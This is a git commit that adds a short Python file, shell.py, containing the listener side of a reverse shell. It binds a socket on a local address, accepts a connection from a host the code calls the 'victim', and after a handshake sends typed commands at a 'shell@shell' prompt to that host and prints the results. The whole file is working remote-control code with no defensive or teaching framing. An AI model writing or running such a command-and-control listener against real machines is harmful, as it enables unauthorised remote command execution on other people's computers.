af9ea0cd7221af7dd640fed9a359268a915c4fd9
Supremo-N9 <125316216+Supremo-N9@users.noreply.github.com>
2023-02-14 22:11:22 -0600

    Create shell.py

---
+++ shell.py
@@ -0,0 +1,21 @@
+import socket
+
+server = socket.socket()
+server.bind(('192.168.0.3', 8080))
+server.listen(1)
+
+while True:
+    victim, address = server.accept()
+    print('Conexion de: {}'.format(address))
+    binary_msg = victim.recv(1024)
+    decoded_msg = binary_msg.decode('ascii')
+
+    if decoded_msg == '1':
+        while True:
+            option = input('shell@shell: ')
+            victim.send(option.encode('ascii'))
+            result = victim.recv(2048)
+            print(result.decode('utf-8'))
+    else:
+        print('Error')
+        break
